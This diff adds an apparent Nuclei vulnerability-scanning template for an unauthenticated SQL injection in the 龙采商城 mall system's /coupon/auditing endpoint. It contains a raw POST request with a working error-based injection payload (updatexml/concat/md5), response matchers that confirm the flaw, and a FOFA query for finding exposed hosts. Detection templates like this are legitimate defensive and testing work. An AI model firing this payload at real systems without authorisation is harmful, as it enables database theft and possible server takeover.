@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - ~4297f44b13955235245b2497399d7a9
+            - 'XPATH syntax error:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /coupon/auditing HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+          X-Requested-With: XMLHttpRequest
+          Content-Type: application/x-www-form-urlencoded
+
+          id=1%20and%20updatexml(1,concat(0x7e,md5(123123),0x7e),1)
+id: longcaishangcheng-auditing-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="'url':'/pc2.0/index/index'"
+        龙采商城系统 auditing 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 龙采商城系统 auditing SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/DCxBaiuqCXUsnLoDCYNqhA
+    severity: high
+    tags: []
